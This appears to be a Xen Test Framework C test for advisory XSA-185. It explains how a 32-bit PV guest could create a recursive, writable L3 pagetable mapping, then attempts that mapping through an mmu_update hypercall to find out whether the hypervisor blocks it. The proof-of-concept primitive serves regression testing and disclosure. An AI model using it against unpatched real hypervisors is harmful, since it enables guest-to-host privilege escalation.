/**
 * @file tests/xsa-185/main.c
 * @ref test-xsa-185
 *
 * @page test-xsa-185 XSA-185
 *
 * Advisory: [XSA-185](http://xenbits.xen.org/xsa/advisory-185.html)
 *
 * This vulnerability is along the same lines as XSA-182, and was uncovered
 * once XSA-182 had been fixed.  Please refer to 182 for the discussion of
 * recursive pagetables.
 *
 * For real 32bit PAE mode, @%cr3 points at a 32byte block of memory
 * containing 4 entries which look a little like regular pagetable entries.
 * When a reload of @%cr3 occurs, they are loaded into 4 internal processor
 * registers.  In this regard, they behave like 4 independent @%cr3 pointers;
 * there aren't actually 3 levels of pagetable being walked by the processor.
 *
 * In these 4 entries, all control bits other than Present and the two
 * cacheability bits are strictly reserved, and must be zero.  User and RW are
 * implied by the actual pagewalk starting at the appropriate L2 table, and
 * not at the block that @%cr3 is actually pointing at.
 *
 * When running a 32bit PV guest on a 64bit, architectural behaviour needs
 * maintaining when running on plain 4-level pagetables.  As such, the guest
 * will not set User/RW, and Xen must set them unconditionally on all L3
 * updates, to maintain architectural behaviour.
 *
 * Because of the construction of 32bit PAE paging on real hardware, there is
 * no way to construct an L3 recursive mapping (to create an equivalent
 * effect, 4 adjacent L2 entries need pointing at the 4 in-use L2 entries), so
 * the security fix is to specifically exclude that option.
 *
 * @see tests/xsa-185/main.c
 */
#include <xtf.h>

#include <arch/x86/pagetable.h>
#include <arch/x86/symbolic-const.h>

void test_main(void)
{
    printk("XSA-185 PoC\n");

    paddr_t cr3_paddr = (paddr_t)xen_cr3_to_pfn(read_cr3()) << PAGE_SHIFT;

     /*
      * Force the use of slot 2.
      *
      * Slots 0 and 3 are definitely in use, and we only have 4 to choose
      * from.  Lets hope that nothing import is using the 3rd GB of virtual
      * address space.
      */
    unsigned long map_slot = 2;

    mmu_update_t mu =
        {
            .ptr = cr3_paddr + (map_slot * PAE_PTE_SIZE),
            .val = cr3_paddr | PF_SYM(AD, U, P),
        };

    printk("  Creating recursive l3 mapping\n");
    if ( hypercall_mmu_update(&mu, 1, NULL, DOMID_SELF) )
    {
        printk("  Attempt to create recursive l3 mapping was blocked\n");
        return xtf_success("Not vulerable to XSA-185\n");
    }

    /* Construct a pointer in the linear map to l3 table. */
    intpte_t *l3_linear = _p(map_slot << L3_PT_SHIFT |
                             map_slot << L2_PT_SHIFT |
                             map_slot << L1_PT_SHIFT);

    if ( l3_linear[map_slot] & PF_SYM(RW) )
        return xtf_failure("Fail: l3 linear mapping is RW\n");
    else
        return xtf_error("Error: l3 linear mapping is not RW, but wasn't blocked\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
